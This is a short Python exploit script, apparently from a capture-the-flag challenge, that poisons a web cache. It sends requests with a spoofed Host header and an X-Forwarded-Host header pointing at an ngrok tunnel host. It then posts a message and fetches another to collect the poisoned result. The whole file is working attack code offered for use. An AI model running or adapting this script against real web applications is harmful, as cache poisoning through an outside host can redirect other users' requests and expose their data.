#!/usr/bin/python3


import requests
import sys

from pwn import *
from pprint import pprint




def explotation(url: str):
    
    
    log.progress("initializing the cache poison...")
    exploit_headers = {
        "Host":"127.0.0.1",
        "X-Forwarded-Host":"c217-157-100-198-203.sa.ngrok.io"
    }
    sess = requests.Session()

    log.info("poisoning")
    sess.get(url=url+"letters?id=11", headers=exploit_headers)


    ress = requests.post(url=url+"submit", json={"message":"suck"})

    # pprint(ress.json())
    
    exploit_ress = requests.get(url=url+"message/12")

    pprint(exploit_ress.json())
    # pprint(exploit_ress.text)


def main():
    try:
        base_url = sys.argv[1]
        explotation(base_url)
    except Exception as e:
        print(str(e))
        exit(1)
    except KeyboardInterrupt:
        exit(0)


if __name__ == "__main__":
    main()
